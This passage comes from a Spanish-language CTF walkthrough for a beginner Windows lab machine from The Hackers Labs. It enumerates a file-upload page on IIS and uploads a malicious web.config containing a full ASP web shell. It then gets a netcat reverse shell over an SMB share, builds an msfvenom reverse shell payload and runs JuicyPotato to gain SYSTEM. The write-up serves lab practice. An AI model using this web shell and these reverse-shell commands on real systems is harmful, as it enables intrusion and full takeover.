-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://10.0.2.140 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> aspx <span class="nt">-s</span> 200 <span class="nt">-r</span>
-200      GET      826l     4457w   331772c http://10.0.2.140/welcome.png
-200      GET       32l       53w      689c http://10.0.2.140/200      GET      121l       61w     1159c http://10.0.2.140/zoc.aspx
-</code></pre></div></div>
-
-<p>Encontramos el fichero <code class="language-plaintext highlighter-rouge">zoc.aspx</code>. Hacemos un <code class="language-plaintext highlighter-rouge">curl</code> para ver el código fuente del fichero:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>─<span class="nv">$ </span>curl http://10.0.2.140/zoc.aspx
-
-&lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="o">&gt;</span>
-
-&lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span> <span class="o">&gt;</span>
-&lt;<span class="nb">head id</span><span class="o">=</span><span class="s2">"Head1"</span><span class="o">&gt;</span>&lt;title&gt;
-        Secure File Transfer
-&lt;/title&gt;&lt;/head&gt;
-&lt;body&gt;
-    &lt;form <span class="nv">name</span><span class="o">=</span><span class="s2">"form1"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"zoc.aspx"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"form1"</span> <span class="nv">enctype</span><span class="o">=</span><span class="s2">"multipart/form-data"</span><span class="o">&gt;</span>
-&lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"__VIEWSTATE"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"__VIEWSTATE"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"/wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkPcJGUl1Hy844izHTIhfkoIHDrbw="</span> /&gt;
-
-&lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"__EVENTVALIDATION"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"__EVENTVALIDATION"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"/wEWAgL3iIH+DALt3oXMAw1C+wxpDnf+65aqZtzoxIjF/bl8"</span> /&gt;
-    &lt;div&gt;
-        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"file"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"FileUpload1"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"FileUpload1"</span> /&gt;
-        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"btnUpload"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Upload"</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">"return ValidateFile();"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"btnUpload"</span> /&gt;
-        &lt;br /&gt;
-        &lt;span <span class="nb">id</span><span class="o">=</span><span class="s2">"Label1"</span><span class="o">&gt;</span>&lt;/span&gt;
-    &lt;/div&gt;
-    &lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-
-&lt;<span class="o">!</span><span class="nt">--</span> /Subiditosdetono <span class="nt">--</span><span class="o">&gt;</span>
-</code></pre></div></div>
-
-<p>Vemos que hay un comentario de un supuesto directorio <code class="language-plaintext highlighter-rouge">/Subiditosdetono</code>.</p>
-
-<p>Si entramos a la url vemos que es una web simple para subir un fichero:</p>
-
-<p><img src="/assets/images/ensala/1.png" alt="image" /></p>
-
-<p>En <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services">hacktricks</a> podemos ver que tipo de ficheros podemos subir al servidor IIS. Vemos que entre los posibles tipos de ficheros esta el <code class="language-plaintext highlighter-rouge">.config</code> . En la misma web podemos encontrar un ejemplo que nos permite hacer ejecucion remota. Nos descargamos el fichero <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config">web.config</a> y lo subimos al servidor.</p>
-
-<p>El fichero <code class="language-plaintext highlighter-rouge">web.config</code>:</p>
-
-<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
-<span class="nt">&lt;configuration&gt;</span>
-   <span class="nt">&lt;system.webServer&gt;</span>
-      <span class="nt">&lt;handlers</span> <span class="na">accessPolicy=</span><span class="s">"Read, Script, Write"</span><span class="nt">&gt;</span>
-         <span class="nt">&lt;add</span> <span class="na">name=</span><span class="s">"web_config"</span> <span class="na">path=</span><span class="s">"*.config"</span> <span class="na">verb=</span><span class="s">"*"</span> <span class="na">modules=</span><span class="s">"IsapiModule"</span> <span class="na">scriptProcessor=</span><span class="s">"%windir%\system32\inetsrv\asp.dll"</span> <span class="na">resourceType=</span><span class="s">"Unspecified"</span> <span class="na">requireAccess=</span><span class="s">"Write"</span> <span class="na">preCondition=</span><span class="s">"bitness64"</span> <span class="nt">/&gt;</span>         
-      <span class="nt">&lt;/handlers&gt;</span>
-      <span class="nt">&lt;security&gt;</span>
-         <span class="nt">&lt;requestFiltering&gt;</span>
-            <span class="nt">&lt;fileExtensions&gt;</span>
-               <span class="nt">&lt;remove</span> <span class="na">fileExtension=</span><span class="s">".config"</span> <span class="nt">/&gt;</span>
-            <span class="nt">&lt;/fileExtensions&gt;</span>
-            <span class="nt">&lt;hiddenSegments&gt;</span>
-               <span class="nt">&lt;remove</span> <span class="na">segment=</span><span class="s">"web.config"</span> <span class="nt">/&gt;</span>
-            <span class="nt">&lt;/hiddenSegments&gt;</span>
-         <span class="nt">&lt;/requestFiltering&gt;</span>
-      <span class="nt">&lt;/security&gt;</span>
-   <span class="nt">&lt;/system.webServer&gt;</span>
-<span class="nt">&lt;/configuration&gt;</span>
-<span class="c">&lt;!--
-&lt;% Response.write("-"&amp;"-&gt;")%&gt;
-&lt;%
-Set oScript = Server.CreateObject("WSCRIPT.SHELL")
-Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
-Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
-
-Function getCommandOutput(theCommand)
-    Dim objShell, objCmdExec
-    Set objShell = CreateObject("WScript.Shell")
-    Set objCmdExec = objshell.exec(thecommand)
-
-    getCommandOutput = objCmdExec.StdOut.ReadAll
-end Function
-%&gt;
-
-&lt;BODY&gt;
-&lt;FORM action="" method="GET"&gt;
-&lt;input type="text" name="cmd" size=45 value="&lt;%= szCMD %&gt;"&gt;
-&lt;input type="submit" value="Run"&gt;
-&lt;/FORM&gt;
-
-&lt;PRE&gt;
-&lt;%= "\\" &amp; oScriptNet.ComputerName &amp; "\" &amp; oScriptNet.UserName %&gt;
-&lt;%Response.Write(Request.ServerVariables("server_name"))%&gt;
-&lt;p&gt;
-&lt;b&gt;The server's port:&lt;/b&gt;
-&lt;%Response.Write(Request.ServerVariables("server_port"))%&gt;
-&lt;/p&gt;
-&lt;p&gt;
-&lt;b&gt;The server's software:&lt;/b&gt;
-&lt;%Response.Write(Request.ServerVariables("server_software"))%&gt;
-&lt;/p&gt;
-&lt;p&gt;
-&lt;b&gt;The server's software:&lt;/b&gt;
-&lt;%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%&gt;
-&lt;% szCMD = request("cmd")
-thisDir = getCommandOutput("cmd /c" &amp; szCMD)
-Response.Write(thisDir)%&gt;
-&lt;/p&gt;
-&lt;br&gt;
-&lt;/BODY&gt;
-
-&lt;%Response.write("&lt;!-"&amp;"-") %&gt;
---&gt;</span>
-</code></pre></div></div>
-<p><img src="/assets/images/ensala/2.png" alt="image" /></p>
-
-<p>Ejecutamos <code class="language-plaintext highlighter-rouge">systeminfo</code> para obtener información del sistema.</p>
-
-<p><img src="/assets/images/ensala/3.png" alt="image" /></p>
-
-<p>Vemos que se trata de un <code class="language-plaintext highlighter-rouge">Windows Server 2008 Enterprise R 2</code> .</p>
-
-<p>Ejecutamos <code class="language-plaintext highlighter-rouge">whoami /priv</code> para ver con que usuario estamos ejecutando los comandos y ver sus privilegios.</p>
-
-<p><img src="/assets/images/ensala/4.png" alt="image" /></p>
-
-<p>Como vemos tiene el privilegio <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> habilitado…</p>
-
-<h1 id="intrusión">Intrusión</h1>
-
-<p>Nos copiamos <code class="language-plaintext highlighter-rouge">Netcat</code> en nuestro directorio:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> /usr/share/windows-binaries/nc.exe <span class="nb">.</span>
-</code></pre></div></div>
-
-<p>Para compartir ficheros con la máquina victima creamos un servidor samba en nuestra máquina. Usamos <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> para crear el server, <code class="language-plaintext highlighter-rouge">-smb2support</code> para dar soporte a smb2, <code class="language-plaintext highlighter-rouge">kali</code> es el nombre que le doy al recurso compartido y <code class="language-plaintext highlighter-rouge">.</code> para compartir lo que tenemos en el directorio actual.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-smbserver <span class="nt">-smb2support</span> kali <span class="nb">.</span>
-Impacket v0.12.0.dev1 - Copyright 2023 Fortra
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-</code></pre></div></div>
-
-<p>Nos ponemos a la escucha:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
-listening on <span class="o">[</span>any] 8888 ...
-
-</code></pre></div></div>
-
-<p>Y tras ejecutar <code class="language-plaintext highlighter-rouge">\\10.0.2.5\kali\nc.exe -e cmd 10.0.2.5 8888</code></p>
-
-<p><img src="/assets/images/ensala/5.png" alt="image" /></p>
-
-<p>Obtenemos la shell:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
-listening on <span class="o">[</span>any] 8888 ...
-connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.140] 49161
-Microsoft Windows <span class="o">[</span>Versi?n 6.1.7600]
-Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation. Reservados todos los derechos.
-
-c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
-</code></pre></div></div>
-
-<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
-
-<p>Ahora nos queda obtener privilegios de administrador. Para ello, como hemos visto antes, nos aprovechamos de los privilegios del usuario. En <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">hacktricks</a> vemos las diferentes posibilidades que tenemos. Yo voy a usar <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">JuicyPotato</a> para la escalada.</p>
-
-<p>Descargamos <a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20240621%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20240621T172808Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=cc316de6c04358d3f93c007d7c6ca6e16edc972949549ffce1471cc4526e01e0&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=142582717&amp;response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&amp;response-content-type=application%2Foctet-stream">JuicyPotato</a> :</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
-</code></pre></div></div>
-
-<p>Creamos una shell reversa para windows con <code class="language-plaintext highlighter-rouge">msfvenom</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.0.2.5 <span class="nv">LPORT</span><span class="o">=</span>8889 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
-</code></pre></div></div>
-
-<p>Nos ponemos a la escucha:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889
-listening on <span class="o">[</span>any] 8889 ...
-
-</code></pre></div></div>
-
-<p>Y ejecutamos:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;<span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\s</span>hell.exe
-<span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\s</span>hell.exe
-Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 443
-COM -&gt; recv failed with error: 10038
-</code></pre></div></div>
-
-<p>Vemos que da error y si buscamos el error encontramos que es debido a que el CLSID que proporciona por defecto JuicyPotato no es valido. Los CLSID para los diferentes Windows podemos encontrar en el siguiente link <a href="https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/">https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/</a></p>
-
-<p>Ejecutamos de nuevo incluyendo un CLSID valido y…:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;<span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\s</span>hell.exe <span class="nt">-c</span> <span class="s2">"{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"</span>
-<span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\s</span>hell.exe <span class="nt">-c</span> <span class="s2">"{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"</span><span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="se">\\</span>10.0.2.5<span class="se">\k</span>ali<span class="se">\s</span>hell.exe <span class="nt">-c</span> <span class="s2">"{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"</span>
-Testing <span class="o">{</span>9B1F122C-2982-4e91-AA8B-E071D54F2A4D<span class="o">}</span> 443
-....
-<span class="o">[</span>+] authresult 0
-<span class="o">{</span>9B1F122C-2982-4e91-AA8B-E071D54F2A4D<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM
-
-<span class="o">[</span>+] CreateProcessWithTokenW OK
-
-c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
-</code></pre></div></div>
-
-<p>Obtenemos una shell como <code class="language-plaintext highlighter-rouge">nt authority\system</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889
-listening on <span class="o">[</span>any] 8889 ...
-connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.140] 49173
-Microsoft Windows <span class="o">[</span>Versi?n 6.1.7600]
-Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation. Reservados todos los derechos.
-
-C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
-<span class="nb">whoami
-</span>nt authority<span class="se">\s</span>ystem
-</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="principiante" /><summary type="html"><![CDATA[Estamos ante una máquina Windows de nivel principiante creada por CuriosidadesDeHackers y condor de la plataforma The Hackers Labs.]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="medio" /><summary type="html"><![CDATA[Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma dockerlabs.]]></summary></entry></feed>
